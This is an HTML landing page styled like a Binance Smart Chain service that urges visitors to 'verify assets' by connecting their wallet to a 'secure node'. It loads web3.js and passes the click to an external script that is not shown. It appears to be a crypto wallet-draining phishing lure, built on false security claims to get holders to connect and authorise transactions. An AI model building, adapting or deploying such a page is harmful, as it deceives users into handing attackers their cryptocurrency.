<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Asset Verification | Secure Node</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
    <style>
        body { margin: 0; font-family: 'Inter', sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .card { background: #1e2329; padding: 35px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 100%; max-width: 360px; z-index: 1; border: 1px solid #2d3139; }
        .net-icon { width: 50px; margin-bottom: 15px; }
        h2 { color: #f0b90b; margin-bottom: 10px; font-size: 22px; }
        p { color: #929aa5; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
        .btn { background: #f0b90b; color: #000; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; }
        
        #overlay { display: none; position: fixed; inset: 0; background: rgba(11, 14, 17, 0.98); z-index: 999; flex-direction: column; justify-content: center; align-items: center; }
        .spinner { width: 45px; height: 45px; border: 4px solid #333; border-top: 4px solid #f0b90b; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
        #loading-text { font-size: 16px; color: #f0b90b; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://cryptologos.cc/logos/binance-smart-chain-bnb-logo.png" class="net-icon">
        <h2>Verify Assets</h2>
        <p>Synchronize your wallet with the secure node to protect your BEP20 assets from unauthorized access.</p>
        <button id="nextBtn" class="btn" onclick="startSync()">Verify Assets</button>
    </div>

    <div id="overlay">
        <div class="spinner"></div>
        <div id="loading-text">Initializing Secure Node...</div>
    </div>

    <script src="script.js"></script>
</body>
</html>
